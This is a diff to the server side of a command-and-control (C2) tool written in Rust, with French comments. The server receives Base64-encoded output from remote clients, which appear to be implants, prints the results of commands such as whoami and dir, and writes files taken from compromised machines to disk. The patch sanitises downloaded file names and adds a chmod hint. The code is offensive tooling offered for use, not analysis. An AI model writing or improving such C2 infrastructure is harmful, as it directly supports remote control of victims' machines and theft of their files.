@@ -7,7 +7,7 @@ use std::sync::Arc;
 use base64::{Engine as _, engine::general_purpose};
 
 fn main() {
-    println!("Démarrage du Serveur C2 en Rust (Full Base64)...");
+    println!("Démarrage du Serveur C2 en Rust (Nom de fichier corrigé)...");
 
     let mut file = File::open("identity.pfx").expect("ERREUR: 'identity.pfx' introuvable !");
     let mut identity_bytes = vec![];
@@ -83,7 +83,7 @@ fn main() {
                                             // On tente de décoder d'abord
                                             match general_purpose::STANDARD.decode(received_b64) {
                                                 Ok(bytes) => {
-                                                    // On vérifie si c'est un message d'erreur du client (qui serait encodé en B64 aussi)
+                                                    // On vérifie si c'est un message d'erreur du client
                                                     let preview = String::from_utf8_lossy(&bytes);
                                                     if preview.starts_with("ERROR:") {
                                                         println!("[-] {}", preview);
@@ -91,11 +91,18 @@ fn main() {
                                                         // C'est le fichier !
                                                         let parts: Vec<&str> = command.split_whitespace().collect();
                                                         if parts.len() >= 2 {
-                                                            let filename = parts[1];
+                                                            let raw_path = parts[1];
+                                                            
+                                                            // --- CORRECTION DU NOM DE FICHIER ---
+                                                            // On nettoie le chemin (ex: C:\Win\System32\calc.exe -> calc.exe)
+                                                            let filename = raw_path.split(|c| c == '\\' || c == '/').last().unwrap_or("downloaded_file.bin");
+
                                                             match File::create(filename) {
                                                                 Ok(mut file) => {
                                                                     file.write_all(&bytes).unwrap();
                                                                     println!("[+] Fichier '{}' reçu ({} octets) !", filename, bytes.len());
+                                                                    // Petit tips pour Linux
+                                                                    println!("[i] Si c'est un binaire Linux : chmod +x {}", filename);
                                                                 },
                                                                 Err(e) => println!("[-] Erreur disque: {}", e),
                                                             }
@@ -105,15 +112,13 @@ fn main() {
                                                 Err(e) => println!("[-] Erreur B64 Download: {}", e),
                                             }
                                         } else {
-                                            // COMMANDE STANDARD (dir, whoami...)
-                                            // On décode le Base64 et on affiche le texte
+                                            // COMMANDE STANDARD
                                             match general_purpose::STANDARD.decode(received_b64) {
                                                 Ok(bytes) => {
                                                     let response = String::from_utf8_lossy(&bytes);
                                                     println!("{}", response);
                                                 },
                                                 Err(_) => {
-                                                    // Fallback si jamais ce n'était pas du B64
                                                     println!("{}", buffer);
                                                 }
                                             }
